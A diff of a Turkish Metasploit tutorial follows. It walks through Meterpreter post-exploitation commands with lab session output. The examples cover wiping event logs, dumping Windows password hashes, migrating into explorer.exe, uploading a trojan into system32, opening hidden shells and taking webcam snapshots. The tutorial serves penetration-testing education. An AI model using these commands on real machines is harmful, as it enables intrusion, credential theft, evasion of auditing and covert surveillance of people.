@@ -34,7 +34,7 @@ Adından da anlaşılacağı gibi, Meterpreter içinde `help` komutunu verdiğin
 
 
 ```bash
-meterpreter **&gt;** help
+meterpreter **>** help
 
 Core Commands
 **=============**
@@ -53,15 +53,15 @@ Core Commands
 
 
 
-`background` komutu, aktif olan Meterpreter oturumunu (session) arka plana gönderir ve sizi tekrar `msf &gt;` komut istemcisine getirir. Arka plandaki Meterpreter oturumuna geçmek için `sessions` komutundan faydalanabilirsiniz.
+`background` komutu, aktif olan Meterpreter oturumunu (session) arka plana gönderir ve sizi tekrar `msf >` komut istemcisine getirir. Arka plandaki Meterpreter oturumuna geçmek için `sessions` komutundan faydalanabilirsiniz.
 
 
 ```bash
-meterpreter **&gt;** background
-msf exploit**(**ms08_067_netapi**)** **&gt;** sessions -i 1
+meterpreter **>** background
+msf exploit**(**ms08_067_netapi**)** **>** sessions -i 1
 **[*********]** Starting interaction with 1...
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -74,19 +74,19 @@ Linux işletim sistemlerinde `cat` komutu, bir dosya içeriğini ekrana yazdırm
 
 
 ```bash
-meterpreter **&gt;** cat
+meterpreter **>** cat
 Usage: cat file
 
 Example usage:
-meterpreter **&gt;** cat edit.txt
+meterpreter **>** cat edit.txt
 What you talkin' about Willis
 
-meterpreter &gt;
+meterpreter >
 ```
 
 
 
-## cd &gt; pwd
+## cd > pwd
 
 
 
@@ -94,12 +94,12 @@ meterpreter &gt;
 
 
 ```bash
-meterpreter **&gt;** pwd
+meterpreter **>** pwd
 c:\
-meterpreter **&gt;** cd c:\windows
-meterpreter **&gt;** pwd
+meterpreter **>** cd c:\windows
+meterpreter **>** pwd
 c:\windows
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -112,11 +112,11 @@ meterpreter **&gt;**
 
 
 ```bash
-meterpreter **&gt;** clearev
+meterpreter **>** clearev
 **[*********]** Wiping 97 records from Application...
 **[*********]** Wiping 415 records from System...
 **[*********]** Wiping 0 records from Security...
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -129,10 +129,10 @@ Karşı bilgisayardan bir dosya indirmeye yarar. İndirilen dosya, metasploit’
 
 
 ```bash
-meterpreter **&gt;** download c:\\boot.ini
-**[*********]** downloading: c:\boot.ini -&gt; c:\boot.ini
-**[*********]** downloaded : c:\boot.ini -&gt; c:\b<a href="http://oot.ini/boot.ini">oot.ini/boot.ini</a>
-meterpreter **&gt;**
+meterpreter **>** download c:\\boot.ini
+**[*********]** downloading: c:\boot.ini -> c:\boot.ini
+**[*********]** downloaded : c:\boot.ini -> c:\b<a href="http://oot.ini/boot.ini">oot.ini/boot.ini</a>
+meterpreter **>**
 ```
 
 
@@ -145,7 +145,7 @@ meterpreter **&gt;**
 
 
 ```bash
-meterpreter **&gt;** ls
+meterpreter **>** ls
 
 Listing: C:\Documents and Settings\Administrator\Desktop
 **========================================================**
@@ -157,7 +157,7 @@ Mode              Size    Type  Last modified              Name
 .
 100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt
 
-meterpreter **&gt;** edit edit.txt
+meterpreter **>** edit edit.txt
 ```
 
 
@@ -170,13 +170,13 @@ meterpreter **&gt;** edit edit.txt
 
 
 ```bash
-meterpreter **&gt;** execute -f cmd.exe -i -H
+meterpreter **>** execute -f cmd.exe -i -H
 Process 38320 created.
 Channel 1 created.
 Microsoft Windows XP **[**Version 5.1.2600]
 **(**C**)** Copyright 1985-2001 Microsoft Corp.
 
-C:\WINDOWS\system32&gt;
+C:\WINDOWS\system32>
 ```
 
 
@@ -189,9 +189,9 @@ Karşı tarafta Meterpreter’in çalıştığı sistemin kullanıcı kimliğini
 
 
 ```bash
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: NT AUTHORITY\SYSTEM
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -204,7 +204,7 @@ meterpreter **&gt;**
 
 
 ```bash
-meterpreter **&gt;** run post/windows/gather/hashdump 
+meterpreter **>** run post/windows/gather/hashdump 
 
 **[*********]** Obtaining the boot key...
 **[*********]** Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
@@ -218,7 +218,7 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
 SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
 victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -231,9 +231,9 @@ Karşı taraftaki bilgisayar kullanıcısının, ne kadar zamandır işlem yapma
 
 
 ```bash
-meterpreter **&gt;** idletime
+meterpreter **>** idletime
 User has been idle **for**: 5 hours 26 mins 35 secs
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -246,7 +246,7 @@ Karşı bilgisayarın ağ bilgilerini görüntüler.
 
 
 ```bash
-meterpreter **&gt;** ipconfig
+meterpreter **>** ipconfig
 
 MS TCP Loopback interface
 Hardware MAC: 00:00:00:00:00:00
@@ -258,12 +258,12 @@ Hardware MAC: 00:0c:29:10:f5:15
 IP Address  : 192.168.1.104
 Netmask     : 255.255.0.0
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
 
-## lpwd &gt; lcd
+## lpwd > lcd
 
 
 
@@ -271,17 +271,17 @@ Meterpreter komut satırı açık iken vereceğiniz komutlar karşı taraf bilgi
 
 
 ```bash
-meterpreter **&gt;** lpwd
+meterpreter **>** lpwd
 /root
 
-meterpreter **&gt;** lcd MSFU
-meterpreter **&gt;** lpwd
+meterpreter **>** lcd MSFU
+meterpreter **>** lpwd
 /root/MSFU
 
-meterpreter **&gt;** lcd /var/www
-meterpreter **&gt;** lpwd
+meterpreter **>** lcd /var/www
+meterpreter **>** lpwd
 /var/www
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -294,7 +294,7 @@ Linux İşletim sistemindeki `ls` komutuyla aynı işlemi yapar. Bulunulan klas�
 
 
 ```bash
-meterpreter **&gt;** ls
+meterpreter **>** ls
 
 Listing: C:\Documents and Settings\victim
 **=========================================**
@@ -318,14 +318,14 @@ Meterpreter sunucumuz, karşı tarafta svchost.exe dosyasının içinde çalış
 
 
 ```bash
-meterpreter &gt; run post/windows/manage/migrate 
+meterpreter > run post/windows/manage/migrate 
 
 [*] Running module against V-MAC-XP
 [*] Current server process: svchost.exe (1076)
 [*] Migrating to explorer.exe...
 [*] Migrating into process ID 816
 [*] New server process: Explorer.EXE (816)
-meterpreter &gt;
+meterpreter >
 ```
 
 
@@ -338,7 +338,7 @@ Hedef bilgisayarda çalışan tüm işlemleri görüntüler.
 
 
 ```bash
-meterpreter **&gt;** ps
+meterpreter **>** ps
 
 Process list
 **============**
@@ -365,9 +365,9 @@ Burada dikkat edilmesi gereken konu, resource komutuna ilk vereceğiniz dosya ye
 
 
 ```bash
-meterpreter **&gt;** resource 
+meterpreter **>** resource 
 Usage: resource path1 path2Run the commands stored **in **the supplied files.
-meterpreter **&gt;**
+meterpreter **>**
 ARGUMENTS:
 
 path1:		Yerel klasörümüzde bulunan toplu iş dosyamız.
@@ -379,7 +379,7 @@ background
 root@kali:~#
 Running resource command:
 
-meterpreter&gt; **&gt;** resource resource.txt
+meterpreter> **>** resource resource.txt
 **[*********]** Reading /root/resource.txt
 **[*********]** Running ls
 
@@ -398,7 +398,7 @@ Mode              Size    Type  Last modified              Name
 **[*********]** Running background
 
 **[*********]** Backgrounding session 1...
-msf  exploit**(**handler**)** **&gt;**
+msf  exploit**(**handler**)** **>**
 ```
 
 
@@ -411,13 +411,13 @@ Karşı sistemde arama yapmamızı sağlar.
 
 
 ```bash
-meterpreter **&gt;** search -f autoexec.bat
+meterpreter **>** search -f autoexec.bat
 Found 1 result...
     c:\AUTOEXEC.BAT
-meterpreter **&gt;** search -f sea*****.bat c:\\xamp\\
+meterpreter **>** search -f sea*****.bat c:\\xamp\\
 Found 1 result...
     c:\\xampp\perl\b**in**\search.bat **(**57035 bytes**)**
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -430,13 +430,13 @@ meterpreter **&gt;**
 
 
 ```bash
-meterpreter **&gt;** shell
+meterpreter **>** shell
 Process 39640 created.
 Channel 2 created.
 Microsoft Windows XP **[**Version 5.1.2600]
 **(**C**)** Copyright 1985-2001 Microsoft Corp.
 
-C:\WINDOWS\system32&gt;
+C:\WINDOWS\system32>
 ```
 
 
@@ -449,10 +449,10 @@ Karşı sisteme bir dosya yüklemenizi sağlar. Hedef sistemin dosya gösterim n
 
 
 ```bash
-meterpreter **&gt;** upload evil_trojan.exe c:\\windows\\system32
-**[*********]** uploading  : evil_trojan.exe -&gt; c:\windows\system32
-**[*********]** uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe
-meterpreter **&gt;**
+meterpreter **>** upload evil_trojan.exe c:\\windows\\system32
+**[*********]** uploading  : evil_trojan.exe -> c:\windows\system32
+**[*********]** uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
+meterpreter **>**
 ```
 
 
@@ -465,10 +465,10 @@ Hedef sistemde kullanılabilir durumda olan web kameralarını listeler.
 
 
 ```bash
-meterpreter **&gt;** webcam_list
+meterpreter **>** webcam_list
 1: Creative WebCam NX Pro
 2: Creative WebCam NX Pro **(**VFW**)**
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -481,10 +481,10 @@ Hedef sistemin web kamerasından bir adet fotoğraf alır ve yerelde bulunduğun
 
 
 ```bash
-meterpreter **&gt;** webcam_snap -i 1 -v false
+meterpreter **>** webcam_snap -i 1 -v false
 **[*********]** Starting...
 **[**+] Got frame
 **[*********]** Stopped
 Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
-meterpreter **&gt;**
+meterpreter **>**
 ```
